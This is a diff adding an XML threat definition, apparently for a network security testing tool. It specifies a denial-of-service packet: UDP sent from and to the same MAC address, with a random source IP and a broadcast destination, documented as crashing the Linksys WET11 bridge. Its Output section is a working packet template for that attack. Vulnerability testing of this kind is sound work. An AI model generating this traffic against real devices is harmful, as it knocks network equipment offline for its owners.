@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc value="UDP Same Source and Dest MAC Address" display="true"/>
+    <EngDesc value="This threat sends out a UDP packet with the same source and destination MAC.  The source IP is random, destination IP is broadcast, dest/source ports are random.  Known to cause Linksys WET11 to crash." display="true"/>
+    <RunOnce value="false" display="false"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol value="Ethernet" display="true"/>
+    <Type_Of_Equipment value="Network_Appliance" display="true"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Linksys"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linksys_WET11"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit value="http://www.securityfocus.com/archive/1/297136" display="true"/>
+    <bugtraqID display="true" value="6046"/>
+    <Author value="Chuck McAuley" display="true"/>
+    <ID value="000000ff464ea1a600a900fe009b00c92c0a1acd" display="true"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="none"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462171" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$destMAC" destMac="$destMAC" pktType="0800" Payload="">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="20" Protocol="11" HeaderChecksum="" srcIP="@random(0.0.0.0, 255.255.255.255)" destIP="255.255.255.255" options="" Payload="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1,65535)" destPort="$destPort" checksum="" length="" Payload="AAAAAA"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
